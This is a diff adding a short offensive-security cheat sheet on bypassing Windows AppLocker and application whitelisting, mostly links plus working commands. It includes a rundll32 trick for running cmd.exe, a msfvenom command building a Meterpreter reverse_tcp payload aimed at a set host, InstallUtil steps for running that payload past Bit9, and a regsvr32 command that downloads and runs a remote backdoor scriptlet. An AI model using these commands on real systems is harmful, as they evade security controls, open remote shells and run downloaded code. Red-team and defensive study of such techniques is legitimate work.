@@ -1,0 +1,30 @@
+# applocker
+
+# https://gist.github.com/hugsy/e5c4ce99cd7821744f95
+# Trick to run arbitrary command when code execution policy is enforced (AppLocker or equivalent). Works on Win98 (lol) and up - tested on 7/8
+rundll32 .\RunMe.dll,RunCommand cmd.exe /k whoami
+
+https://www.attackdebris.com/?p=143
+rundll32 meterpreter.dll, blah
+
+# bypassing application whitelisting
+https://github.com/subTee/ApplicationWhitelistBypassTechniques/blob/master/TheList.txt
+https://khr0x40sh.wordpress.com/2015/05/27/whitelist-evasion-revisited/
+
+* InstallUtil.exe worked for me against Bit9 v7.0.2 build 1492
+./msfvenom -f csharp -p windows/meterpreter/reverse_tcp LPORT=1234 LHOST=10.75.3.20 > /tmp/csharp.cs
+python InstallUtil.py --cs_file /tmp/csharp.cs --exe_file /opt/m/share/csharp.exe
+C:\Windows\Microsoft.NET\Framework\v2.0.50727\InstallUtil.exe /logfile= /LogToConsole=false /U csharp.exe
+
+# good list of possible techniques
+http://en.wooyun.io/2016/01/28/Bypass-Windows-AppLocker.html
+
+# xls opening a cmd via VBA
+http://blog.didierstevens.com/2016/02/10/create-your-own-cmd-xls/
+
+# C:\Windows\Tracing
+https://twitter.com/subTee/status/681604454051778561
+
+# regsvr32
+http://subt0x10.blogspot.com.au/2016/04/bypass-application-whitelisting-script.html
+regsvr32 /s /n /u /i:https://gist.githubusercontent.com/subTee/24c7d8e1ff0f5602092f58cbb3f7d302/raw/39138e17a3e382da70ab336cbd29e7c37b16d22b/Backdoor-Minimalist.sct … scrobj.dll https://twitter.com/aionescu/status/723266342829182976
